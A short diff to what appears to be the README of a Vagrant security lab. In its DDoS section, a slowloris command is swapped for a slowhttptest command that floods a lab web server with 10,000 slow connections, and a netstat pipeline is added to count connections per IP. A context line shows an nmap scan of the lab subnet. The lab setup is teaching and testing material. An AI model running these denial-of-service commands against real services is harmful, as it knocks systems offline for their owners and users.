@@ -107,5 +107,12 @@ nmap -n -sT -sV -sC 192.168.33.0/24
 ## DDoS
 ```
 vagrant ssh compromised
-perl slowloris.pl/slowloris.pl -dns 192.168.33.11
+slowhttptest -c 10000 -H -g -o slowhttp -i 10 -r 500 -t GET -u http://web.local:8080 -x 24 -p 3
+
+```
+
+Show the number of active connections per IP :
+```
+vagrant ssh web
+netstat -ntu -4 -6 |  awk '/^tcp/{ print $5 }' | sed -r 's/:[0-9]+$//' |  sort | uniq -c | sort -n
 ```
